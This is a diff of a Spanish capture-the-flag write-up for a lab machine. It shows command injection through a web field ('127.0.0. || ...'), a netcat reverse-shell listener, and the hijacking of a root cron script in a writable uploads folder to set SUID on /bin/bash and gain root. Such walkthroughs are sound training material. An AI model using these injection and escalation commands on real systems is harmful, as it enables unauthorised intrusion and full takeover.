@@ -104,27 +104,31 @@ Tenemos dos opciones para escalar privilegios, una por la página web, aunque es
 127.0.0. || find / -perm -4000 2>/dev/null
 ```
 
-Vamos primero a mirar como podriamos escalar privilegios desde la herramienta de la página web, lanzamos un find perm para buscar...
+Vamos primero a mirar como podriamos escalar privilegios desde la herramienta de la página web, lanzamos un find perm pero no vemos nada útil.
 
 
 <img width="1349" height="764" alt="8perm" src="https://github.com/user-attachments/assets/bffb5dab-750a-4a9f-a99f-e4abd1dd6a3e" />
-
-No vemos nada, vamos a mirar las tareas cron.
+<br><br>
+Vamos a mirar a ver si tiene tareas cron.
 
 <img width="1349" height="936" alt="10crontab" src="https://github.com/user-attachments/assets/9b131993-87ca-46a5-b5f4-570313424a47" />
+<br><br>
 
-
-```bash
-
-```
 <img width="1434" height="901" alt="11cron" src="https://github.com/user-attachments/assets/6e6abbf5-4eac-489a-b8d1-2c5786441d9a" />
 <br><br>
 
 Miramos que contiene ese fichero cleanup y también vamos a mirar que permisos tiene.
 <img width="1438" height="864" alt="cleanup" src="https://github.com/user-attachments/assets/81b4167c-f70c-45d7-a167-e376a5da64ae" />
 <img width="1355" height="916" alt="permisoscleanup" src="https://github.com/user-attachments/assets/b120df1d-aa4e-42e0-a594-da59ad6788d9" />
+<br><br>
 
-Vamos a proceder a realizar una reverse shell para poder trabjar más ocmodamente.
+127.0.0. || echo "#!/bin/bash" > uploads/cleanup.sh
+127.0.0. || chmod +x uploads/cleanup.sh 
+127.0.0. || echo 'chmod u+s' >> uploads/cleanup.sh
+
+127.0.0. || echo 'chmod u+s /bin/bash' >> uploads/cleanup.sh
+
+Vamos a proceder a realizar una reverse shell para poder trabajar más comodamente.
 
 
 ### Intrusión (Reverse Shell)
@@ -146,7 +150,7 @@ sudo nc -lvnp 440
 <img width="723" height="88" alt="nc" src="https://github.com/user-attachments/assets/1dc57619-3557-4fcb-bff1-31912973d5ea" />
 <br><br>
 
-Ya somos el usuario web-admin desde una terminal, ahora podemos sanitizarla o continuar así, se ve peor pero como anteriormente vimos que con sudo -l podíamos ejecutar find sin contraseña como el usuario root, vamos a escalar privilegios.
+Ya somos el usuario web-admin desde una terminal, ahora podemos sanitizarla o continuar usandola tal y como está.
 
 ```bash
 # Tratamiento de  la TTY para tener una consola interactiva cómoda
@@ -162,10 +166,12 @@ export TERM=xterm
 
 ### Enumeración del Sistema
 
-
+Revisamos las tareas cron
 <img width="1716" height="503" alt="establecido" src="https://github.com/user-attachments/assets/b4d33ec9-659b-4fdd-a412-438532918088" />
 <br><br>
-Estamos dentro, 
+
+La variable PATH define los directorios donde el sistema busca los ejecutables cuando se introduce un comando sin especificar su ruta completa. Vemos que primero busca en la carpeta de uploads por lo que nos aprovecharemos de que podemos escribir dentro de esa carpeta y primero buscará ahi cleanup.
+
 <img width="785" height="239" alt="revisar" src="https://github.com/user-attachments/assets/c19c3461-39f8-4d3c-b834-0c92cfef203b" />
 <br><br>
 
@@ -173,13 +179,13 @@ Estamos dentro,
 
 ### Explotación del Vector de Escalada
 
+Como ya le dimos permisos a la bash, ejecutamos /bin/bash -p para convertirnos en root.
 <img width="213" height="89" alt="1" src="https://github.com/user-attachments/assets/2728044c-16f7-476b-98ec-faef36635cb8" />
 <br><br>
 
-<img width="403" height="166" alt="2" src="https://github.com/user-attachments/assets/f393163f-1c75-42f9-a54c-d507d91b51df" />
-<br><br>
-¡Ya somos **root**! 🚩 Buscamos la flag en la carpeta personal de root.
+¡Ya somos *root*! Buscamos la flag en la carpeta personal de root.
 
+<img width="403" height="166" alt="2" src="https://github.com/user-attachments/assets/f393163f-1c75-42f9-a54c-d507d91b51df" />
 <br><br>
 
 Por último, validamos la flag obtenida.
